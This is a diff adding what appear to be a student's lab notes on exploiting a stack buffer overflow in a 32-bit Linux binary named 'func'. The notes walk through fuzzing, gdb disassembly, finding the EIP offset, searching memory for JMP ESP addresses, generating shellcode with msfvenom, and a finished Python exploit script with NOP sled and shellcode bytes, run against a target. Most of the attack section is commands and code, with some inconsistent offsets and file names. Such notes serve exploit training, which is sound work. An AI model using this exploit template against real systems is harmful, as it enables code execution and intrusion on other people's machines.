@@ -1,0 +1,117 @@
+#### 1ST PART OF WEB EXPLOTATION ####
+
+1## DOWNLOAD func
+2## STATIC ANALYSIS (Can only be done from my machine)
+3## 	strings func
+4## 	file func
+5## Wants a string, is an ELF (executable)
+6## Behavioral Analysis
+7##	chmod u+x func
+8##	./func  to run it
+9## Command Substitution:
+10##	./func $(echo "12345")
+11## User Input:
+12##	./func <<<$(echo "12345")
+13## Dynamic Analysis
+14## Fuzzing
+15##	./func <<<$echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")  to break it until it gives an error, tells me how many characters can be input
+16## gdb ./func ( type shell to get back into my station, type exit again to get back into gdb )
+	shell ( gives shell )
+	exit ( gets us back to gdb )
+	info functions
+	run ( ctrl+c to exit )
+	info functions again ( more output than before )
+17## Disassembly
+	pdisass main
+	pdisass <new function call>
+	pdisass getuserinput
+	pdisass gets@plt ( is the vulnerable red color )
+	pdisass puts@plt
+
+
+#### 2ND PART OF WEB EXPLOTATION ####
+
+need to create a python script:
+	vi libuf.py
+	inside type:
+	#!/usr/bin/env python
+	offset = "A" * 100
+	print(offset)
+	wq:! to save it
+
+ON gdb, run <<<$(python ./linbuf.py)
+
+pointers I will see ( EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP, EIP, EFLAGS )
+I'm interested on EIP
+
+search wiremask overflow generator to find EIP change length to 100, copy code of A's into script and replace single "A" 
+ run <<<$(python ./linbuf.py)
+copy the diferrent hex generated at bottom into wiremask to get offset of Buffer
+ edit script, change it back to single "A" and the 100 for 76
+ 
+verify the EIP by putting 4*"B"s
+add to script "eip = "B" * 4" and also on print(offset + eip) 
+run <<<$(python ./linbuf.py) should be 0x42424242 
+
+example:
+
+#!/usr/bin/env python
+
+offset = "A" * 76
+eip = "B" * 4
+
+print(offset + eip)
+
+
+
+FROM A SHELL ON TARGET 
+Find the JMP ESP location
+	shell
+	env - gdb ./func
+	unset env LINES
+	unset env COLUMNS
+	show env ( verify nothing is there )
+	run OR start ( run just runs it, start allows for breakpoints ) ctrl + c
+	info proc map ( go to next line after heap )
+	(may need to run "step" and "info proc map" again to see heap an stack)
+	memory address after heap 0xf7de1000
+	memory address before stack 0xffffe000
+	find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
+JMP ESP locations ( copy at least top five )
+	0xf7de3b59
+	0xf7f588ab
+	0xf7f645fb
+	0xf7f6460f
+	0xf7f64aeb
+Little Endian conversion
+	f7 de 3b 59 > \x59\x3b\xde\xf7
+modify vi :
+
+	#!/usr/bin/env python
+
+	offset = "A" * 62
+	eip = \x59\x3b\xde\xf7
+	nop = "\x90" * 15
+
+	print(offset + eip + nop)
+
+	run on lin ops :
+ msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\ff" -f python
+	copy the buf into linbuf.py
+
+#!/usr/bin/env python
+
+offset = "A" * 62
+eip = "\x59\x3b\xde\xf7"
+nop = "\x90" * 15
+buf =  b""
+buf += b"\xd9\xc2\xbe\x52\xcc\xea\xca\xd9\x74\x24\xf4\x58"
+buf += b"\x31\xc9\xb1\x0b\x31\x70\x19\x03\x70\x19\x83\xe8"
+buf += b"\xfc\xb0\x39\x80\xc1\x6c\x5b\x07\xb0\xe4\x76\xcb"
+buf += b"\xb5\x13\xe0\x24\xb5\xb3\xf1\x52\x16\x21\x9b\xcc"
+buf += b"\xe1\x46\x09\xf9\xf5\x88\xae\xf9\x8e\xe0\xc1\x98"
+buf += b"\x1d\x99\x1d\x0c\x8d\xd0\xff\x7f\xb1"
+print(offset + eip + nop + buf)
+
+From lin-ops run:	
+	./func <<<$(python linbuf.py)
